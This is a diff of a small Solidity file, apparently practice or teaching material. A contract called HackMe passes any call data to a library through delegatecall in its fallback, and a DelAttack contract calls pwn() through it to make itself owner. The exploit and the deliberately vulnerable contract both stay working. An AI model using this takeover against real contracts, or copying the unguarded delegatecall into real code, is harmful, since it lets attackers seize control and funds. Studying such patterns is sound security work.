@@ -1,20 +1,16 @@
 pragma solidity ^0.8.4;
-// library contract - calculates fibonacci-like numbers;
 import "hardhat/console.sol";
 contract Lib {
     address public owner;
     
-    function getOwner() public view returns(address) {
-        return owner;
-    }
 
     constructor() {
         owner = msg.sender;
     }
 
-    function pwn(address _Owner) public {
-        console.log("here");
-        owner = _Owner;
+    function pwn() public payable {
+        console.log("whynot ");
+        owner = msg.sender;
     }
 }
 
@@ -27,9 +23,17 @@ contract HackMe {
         lib = Lib(_lib);
     }
 
+    function getOwner() public view returns(address) {
+        return owner;
+    }
+
     fallback() external payable {
         console.log("here");
-        address(lib).delegatecall(msg.data);
+        console.log(owner);
+        (bool sent, ) = payable(address(lib)).delegatecall(msg.data);
+       
+        //(bool sent2, ) = payable(address(lib)).delegatecall(abi.encodeWithSignature("pwn()"));
+        console.log(owner);
     }
 }
 
@@ -42,8 +46,7 @@ contract DelAttack {
     }
 
     function attack() public {
-         console.log("here");
-         (bool sent, ) = hackMe.call{value:1 ether}(abi.encodeWithSignature("pwn()"));
+         (bool sent, ) = hackMe.call(abi.encodeWithSignature("pwn()"));
          console.log(sent);
     }
 }
